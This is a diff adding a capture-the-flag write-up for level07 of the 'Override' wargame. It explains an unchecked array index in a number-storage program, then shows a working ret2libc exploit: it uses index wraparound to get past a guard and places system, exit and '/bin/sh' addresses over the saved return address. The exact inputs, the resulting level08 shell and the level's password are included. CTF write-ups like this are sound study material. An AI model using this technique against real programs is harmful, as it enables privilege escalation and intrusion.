@@ -1,0 +1,99 @@
+# Override - level07
+
+We've started executing the binary to see what was asking.
+
+It asked for one of the three following commands: store, read or quit.
+
+Disassembling level07 with gdb we noticed two interesting functions
+store_number called with the store command and read_number called with
+read.
+
+The `store_number` function asks for a `number` and `index` from `stdin` (4 bytes each).
+If (index % 3 == 0 || (number >> 0x18) == 0xb7), the function prints an error and returns
+otherwise, iit stores `number` @ (`data` + (`index` * 4)) and returns.
+
+There's no check on `index` input, hence we can write to memory even outside `data` boundaries.
+
+The `read_number` function does the following asks for an `index` from `stdin`.
+It returns 4-bytes dumped @ (`data` + (`index` * 4)).
+
+There's no check on `index` input, hence we can read from memory even outside `data` boundaries.
+
+We are gonna use an integer overflow to overwrite EIP to launch the shell when we quit our program.
+
+We found the addresses of system, exit using info funcion.
+
+```
+system		= 0xf7e6aed0 = 4159090384 (decimal)
+exit		= 0xf7e5eb70 = 4159040368 (decimal)
+```
+
+and /bin/sh using 
+
+```
+find &system,+9999999,"/bin/sh"
+0xf7f897ec
+
+"/bin/sh"	= 0xf7f897ec = 4160264172 (decimal)
+```
+
+The EIP address can be found with the info frame command setting a breakpoint before
+read_number in main and the data[0] address can be found printing $esp + 0x24 using
+x command in gdb.
+
+```
+eip		= 0xffffd70c = 4294956812
+array	= 0xffffd544 = 4294956356
+```
+
+Now we can substract EIP and the data[0] address to get the index that
+we can use to write the system address on EIP.
+
+```
+4294956812 - 4294956356 = 456 / 4 = 114 (divide by 4 because it is int sized)
+```
+
+But since index 114 is protected we need to make an integer overflow to access it.
+
+We add MAX_INT / 4 to 144 to create integer overflow.
+
+We proceed to store addresses of
+
+```
+system   4159090384 to index 1073741938 (114 + (2^32 / 4)) EIP,
+exit     4159040368 to index 115 EIP+1,
+/bin/sh  4160264172 to index 116 EIP+2,
+```
+
+we quit and level08 shell opens.
+
+```
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: store
+ Number: 4159040368
+ Index: 115
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+$ cat ~level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
